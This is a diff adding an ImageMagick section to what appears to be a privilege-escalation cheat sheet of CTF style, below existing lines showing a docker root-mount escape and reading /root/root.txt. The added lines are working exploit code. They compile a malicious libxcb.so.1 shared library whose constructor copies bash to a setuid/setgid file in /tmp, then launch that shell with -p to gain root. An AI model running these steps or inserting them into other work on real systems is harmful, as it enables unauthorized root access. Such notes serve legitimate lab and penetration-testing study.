@@ -213,3 +213,23 @@ Or with a proper TTY:
 docker run -v /:/mnt --rm -it mysql chroot /mnt bash
 cat /root/root.txt
 ```
+##ImageMagick
+```
+magick -version
+Version: ImageMagick 7.1.1-35
+
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
+    exit(0);
+}
+EOF
+
+ls -l /tmp/0xdf
+
+ /tmp/0xdf -p
+```
